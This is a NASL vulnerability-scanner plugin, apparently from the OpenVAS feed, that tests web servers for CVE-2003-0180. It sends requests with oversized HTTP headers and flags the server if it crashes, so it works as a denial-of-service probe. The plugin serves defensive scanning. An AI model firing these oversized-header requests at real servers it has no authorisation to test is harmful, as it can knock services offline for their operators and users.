if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11129" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2003-0180" );
	script_bugtraq_id( 6951 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "HTTP 1.1 header overflow" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade your software or protect it with a filtering reverse proxy." );
	script_tag( name: "summary", value: "It was possible to kill the web server by sending an invalid request
  with a too long HTTP 1.1 header (Accept-Encoding, Accept-Language, Accept-Range, Connection, Expect,
  If-Match, If-None-Match, If-Range, If-Unmodified-Since, Max-Forwards, TE, Host)" );
	script_tag( name: "impact", value: "An attacker may exploit this vulnerability to make the web server
  crash continually or even execute arbirtray code on your system." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
r = NASLString( "GET / HTTP/1.1\\r\\nHost: ", crap( 1024 ), "\\r\\n\\r\\n" );
send( socket: soc, data: r );
r = http_recv( socket: soc );
http_close_socket( soc );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
r1 = NASLString( "GET / HTTP/1.1\\r\\nHost: ", get_host_ip(), "\\r\\n" );
requests = make_list( NASLString( r1,
	 "Accept-Encoding: ",
	 crap( 4096 ),
	 "compress, *\\r\\n\\r\\n" ),
	 NASLString( r1,
	 "Accept-Language: en, ",
	 crap( 4096 ),
	 "\\r\\n\\r\\n" ),
	 NASLString( r1,
	 "Accept-Range: ",
	 crap( data: "bytes",
	 length: 4096 ),
	 "\\r\\n\\r\\n" ),
	 NASLString( r1,
	 "Connection: ",
	 crap( data: "close",
	 length: 4096 ),
	 "\\r\\n\\r\\n" ),
	 NASLString( r1,
	 "Expect: ",
	 crap( 4096 ),
	 "=",
	 crap( 4096 ),
	 "\\r\\n\\r\\n" ),
	 NASLString( r1,
	 "If-Match: ",
	 crap( 4096 ),
	 "\\r\\n\\r\\n" ),
	 NASLString( r1,
	 "If-None-Match: ",
	 crap( 4096 ),
	 "\\r\\n\\r\\n" ),
	 NASLString( r1,
	 "If-Range: ",
	 crap( 4096 ),
	 "\\r\\n\\r\\n" ),
	 NASLString( r1,
	 "If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 ",
	 crap( data: "GMT",
	 length: 1024 ),
	 "\\r\\n\\r\\n" ),
	 NASLString( r1,
	 "Max-Forwards: ",
	 crap( data: "6",
	 length: 4096 ),
	 "\\r\\n\\r\\n" ),
	 NASLString( r1,
	 "TE: deflate, ",
	 crap( 4096 ),
	 "\\r\\n\\r\\n" ) );
for request in requests {
	soc = http_open_socket( port );
	if(!soc){
		continue;
	}
	send( socket: soc, data: request );
	http_recv( socket: soc );
	http_close_socket( soc );
	if(http_is_dead( port: port )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

